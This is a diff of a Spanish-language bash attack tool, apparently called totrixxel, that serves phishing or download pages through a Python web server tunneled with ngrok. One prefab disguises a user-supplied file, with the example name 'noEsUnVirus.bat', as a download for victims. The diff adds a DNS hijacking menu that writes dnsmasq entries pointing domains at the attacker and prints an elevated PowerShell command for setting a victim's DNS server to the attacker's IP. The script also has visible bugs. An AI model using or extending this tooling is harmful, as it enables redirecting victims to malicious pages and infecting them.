@@ -54,7 +54,6 @@ function banner() {
 }
 
 function init_program() {
-    banner
     if [ $(type -P ngrok) != "" ]
     then
         ngrok tcp 80 --log reg > /dev/null &
@@ -66,19 +65,21 @@ function init_program() {
         ngrokPort=$(echo $url | tr ":" "\n" | tail -1)
     else
         clear
-        echo "[*] Ngrok Server is not configured. https://ngrok.com"
     fi
     if [ $(ps aux | grep http | wc -l) -lt 2 ]
     then
         sudo python -m http.server 80 -d server> /dev/null &
     fi
+    banner
     echo -e "[*] Servidor Python iniciado en $CYAN$ip$GREEN:80$NORMAL"
     if [ $(ps aux | grep ngrok | wc -l) -gt 1 ]; then
         echo -e "[*] Servidor Ngrok iniciado en $CYAN$ngrokUrl$GREEN:$ngrokPort$NORMAL"
+    else 
+        echo "[*] Ngrok Server is not configured. https://ngrok.com"
     fi
     
     echo -e "\nQue quieres hacer?"
-    echo -e "[1] Montar pagina local      [2] Descargar prefabs (git)\n[3] Iniciar pagina local     [4] Iniciar DNS"; read qaction
+    echo -e "[1] Montar pagina local      [2] Descargar prefabs (git)\n[3] Iniciar pagina local     [4] Servidor DNS"; read qaction
     if [ $qaction == "1" ]
     then
         echo -e "Tienes una pagina?[y/n] >> "; read qpagexist
@@ -86,28 +87,28 @@ function init_program() {
         then
             echo -e "[*] Info: Ej: /home/$usuario/Descargas/prefabs/"
             echo -e "Ruta completa de la pagina >> "; read pagdir
-            rm -r server/*
-            cp  $pagdir* server/*
+            if [ $(ls server/ | wc -l) -gt 0 ]; then rm -r server/*; fi 
+            cp  $pagdir* server/
         elif [ $qpagexist == "n" ]
         then
             echo -e "Selecciona un prefab"
             echo -e "[0] Txx Info    [1] Downloader Page\n"; read qprefabpag
             if [ $qprefabpag == "0" ]
             then
-            	rm -r server/*
-            	cp /prefabs/txx/* server/*
+                if [ $(ls server/ | wc -l) -gt 0 ]; then rm -r server/*; fi     
+            	cp prefabs/txx/* server/
             elif [ $qprefabpag == "1" ]
             then
-                rm -r server/*
+                if [ $(ls server/ | wc -l) -gt 0 ]; then rm -r server/*; fi 
                 echo -e "[*] Info: Ej: /home/$usuario/Descargas/prepag/noEsUnVirus.bat"
                 echo -e "Ruta completa de el archivo >> "; read filedir
                 cp $filedir server/
                 mv server/* server/archivo.txt
-                cp /prefabs/dwd_file/* server/
+                cp prefabs/dwd_file/* server/
             elif [ $qprefabpag == "3" ]
             then
-                rm -r server/*
-                cp /prefabs/tw/* server/*
+                if [ $(ls server/ | wc -l) -gt 0 ]; then rm -r server/*; fi 
+                cp prefabs/tw/* server/
             else
                 echo -e "[-] Err: Opcion no existe."
             fi
@@ -129,7 +130,7 @@ function init_program() {
     then
         echo -e "Creador del repo"; read repouser
         echo -e "\nNombre del repo";read reponame
-        rm -r server/*
+        if [ $(ls server/ | wc -l) -gt 0 ]; then rm -r server/*; fi 
         cd server/
     	git clone https://www.github.com/$repouser/$reponame
     elif [ $qaction == "3" ]
@@ -144,54 +145,73 @@ function init_program() {
         echo -e "[*] El servidor Ngrok se ha cerrado correctamente."
     elif [ $qaction == "4" ]
     then
-        if which "dnsmasq" >/dev/null 2>&1; then
-            echo "Domain Name."; read dname
-            echo -e "\nIp Address."; read ipaddr
-            echo "Add or Rewrite DNS config [A/r]"; read chkf
-            if [ $chkf == "r" -o $chkf == "R" ]; then
-                echo -e "\nold Dns config file saved in: ~/.dnsmasq.conf.old"
-                echo -e "address=/$dname/$ipaddr" > /etc/dnsmasq.conf
+        echo -e "[0] Atras        [1] Start DNS\n[2] Config DNS   [3] Config DNS in victim"
+        echo -n "> "; read dnsaction
+        if [ $dnsaction == "0" ]; then
+            init_program
+        elif [ $dnsaction == "1" ]; then
+            if which "dnsmasq" >/dev/null 2>&1; then
                 sudo systemctl restart dnsmasq.service
             else
-                echo -e "\naddress=/$dname/$ipaddr" >> /etc/dnsmasq.conf
-                echo "[+] /etc/dnsmasq.conf is updated."
+                install_dnsmasq
             fi
-        else
-            osdata=cat /etc/os-release | grep ID= | head -n 1
-            arr=(${osdata//"="/ }); osid=${arr[1]}
-            if [ $osid == "arch" -o $osid == "manjaro" ]; then
-                pacman -S dnsmasq
-            elif [ $osid == "debian" -o $osid == "kali" -o $osid == "parrot" -o $osid == "ubuntu" -o $osid == "linuxmint" ]; then
-                apt-get instal dnsmasq
-            elif [ $osid == "fedora" ]; then
-                dnf install dnsmasq
-            elif [ $osid == "centos" -o $osid == "rhel" ]; then
-                yum install dnsmasq
-            elif [ $osid == "opensuse" ]; then
-                zypper install dnsmasq
-            elif [ $osid == "gentoo" ]; then
-                emerge dnsmasq
-            elif [ $osid == "alpine" ]; then
-                apk add dnsmasq 
+        elif [ $dnsaction == "2" ]; then
+            if which "dnsmasq" >/dev/null 2>&1; then
+                echo "Domain Name."; read dname
+                echo -e "\nIp Address."; read ipaddr
+                echo "Add or Overwrite DNS config [A/o]"; read chkf
+                if [ $chkf == "o" -o $chkf == "O" ]; then
+                    echo -e "\nold Dns config file saved in: ~/.dnsmasq.conf.old"
+                    echo -e "address=/$dname/$ipaddr" > /etc/dnsmasq.conf
+                    sudo systemctl restart dnsmasq.service
+                else
+                    echo -e "\naddress=/$dname/$ipaddr" >> /etc/dnsmasq.conf
+                    echo "[+] /etc/dnsmasq.conf is updated."
+                fi
             else
-                echo "No fue posible obtener el ID de su sistema. "
-                echo "Por favor especifique el comando para instalar paquetes en su sistema"
-                echo "Ej: apt-get install"; read syscom
-                $($syscom dnsmasq)
+                install_dnsmasq
             fi
+        elif [ $dnsaction == "3" ]; then
+            echo -e "Start-Process powershell -ArgumentList \"Set-DnsClientServerAddress -InterfaceAlias  'Wi-Fi' -ServerAddresses '$ip'\" -Verb -RunAs"
+            echo -e "Ten en cuenta que la interfaz puede variar, normalmente si es una conexion wireless, la interfaz sera Wi-Fi"
+            echo -e "Y en caso de ser cableada lo mas probable es que sea Ethernet"
         fi
-        echo -e "[]"
     fi
 }
-
+# Instalar DnsMasq
+function install_dnsmasq() {
+    echo "[*] Obteniendo ID de sistema operativo."
+    osdata=cat /etc/os-release | grep ID= | head -n 1
+    arr=(${osdata//"="/ }); osid=${arr[1]}
+    if [ $osid == "arch" -o $osid == "manjaro" ]; then
+        pacman -S dnsmasq
+    elif [ $osid == "debian" -o $osid == "kali" -o $osid == "parrot" -o $osid == "ubuntu" -o $osid == "linuxmint" ]; then
+        apt-get instal dnsmasq
+    elif [ $osid == "fedora" ]; then
+        dnf install dnsmasq
+    elif [ $osid == "centos" -o $osid == "rhel" ]; then
+        yum install dnsmasq
+    elif [ $osid == "opensuse" ]; then
+        zypper install dnsmasq
+    elif [ $osid == "gentoo" ]; then
+        emerge dnsmasq
+    elif [ $osid == "alpine" ]; then
+        apk add dnsmasq 
+    else
+        echo "No fue posible obtener el ID de su sistema. "
+        echo "Por favor especifique el comando para instalar paquetes en su sistema"
+        echo "Ej: apt-get install"; read syscom
+        $($syscom dnsmasq)
+    fi
+}
 #Cargar Prefabricados
 function charge_prefabs() {
     echo "[?] Quieres instalar prefabs? "; read cck
-    if [ $cck != "n" ] && [ $cck == "N" ]
-    then
+    if [ $cck != "n" ] && [ $cck == "N" ]; then
         cp totrixxel.sh /usr/bin/
         mv /usr/bin/totrixxel.sh /usr/bin/totrixxel
         cp -r prefabs /usr/bin/
+    fi
     init_program
 }
 
